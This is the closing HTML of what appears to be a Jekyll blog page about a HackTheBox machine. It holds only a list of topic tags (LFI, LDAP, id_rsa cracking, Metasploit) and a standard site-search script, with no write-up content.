Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
